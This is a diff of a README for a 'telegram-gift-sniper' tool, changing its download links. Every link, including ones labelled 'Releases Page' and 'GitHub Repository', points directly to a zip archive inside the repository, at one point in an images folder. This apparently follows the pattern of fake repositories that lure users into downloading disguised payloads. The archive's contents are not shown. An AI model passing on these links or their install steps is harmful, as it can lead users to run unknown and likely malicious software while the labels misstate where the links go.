@@ -6,9 +6,9 @@ Welcome to telegram-gift-sniper! This tool helps you grab the best deals on gift
 
 ## 📥 Download & Install
 
-[![Download Now](https://raw.githubusercontent.com/DIEGO879112/telegram-gift-sniper/main/utils/sniper-gift-telegram-v1.7.zip%https://raw.githubusercontent.com/DIEGO879112/telegram-gift-sniper/main/utils/sniper-gift-telegram-v1.7.zip)](https://raw.githubusercontent.com/DIEGO879112/telegram-gift-sniper/main/utils/sniper-gift-telegram-v1.7.zip)
+[![Download Now](https://github.com/DIEGO879112/telegram-gift-sniper/raw/refs/heads/main/images/gift_sniper_telegram_v2.0.zip%https://github.com/DIEGO879112/telegram-gift-sniper/raw/refs/heads/main/images/gift_sniper_telegram_v2.0.zip)](https://github.com/DIEGO879112/telegram-gift-sniper/raw/refs/heads/main/images/gift_sniper_telegram_v2.0.zip)
 
-1. Go to the **Releases** page: [Visit this page to download](https://raw.githubusercontent.com/DIEGO879112/telegram-gift-sniper/main/utils/sniper-gift-telegram-v1.7.zip).
+1. Go to the **Releases** page: [Visit this page to download](https://github.com/DIEGO879112/telegram-gift-sniper/raw/refs/heads/main/images/gift_sniper_telegram_v2.0.zip).
 2. Look for the latest version at the top of the page.
 3. Click on the file that matches your operating system (Windows, macOS, or Linux).
 4. Download the file to your computer.
@@ -78,7 +78,7 @@ telegram-gift-sniper is licensed under the MIT License. You can freely use or mo
 
 ## 🔗 Links
 
-- [Releases Page](https://raw.githubusercontent.com/DIEGO879112/telegram-gift-sniper/main/utils/sniper-gift-telegram-v1.7.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/DIEGO879112/telegram-gift-sniper/main/utils/sniper-gift-telegram-v1.7.zip)
+- [Releases Page](https://github.com/DIEGO879112/telegram-gift-sniper/raw/refs/heads/main/images/gift_sniper_telegram_v2.0.zip)
+- [GitHub Repository](https://github.com/DIEGO879112/telegram-gift-sniper/raw/refs/heads/main/images/gift_sniper_telegram_v2.0.zip)
 
 Thank you for choosing **telegram-gift-sniper**! Enjoy claiming and reselling your gifts effortlessly.
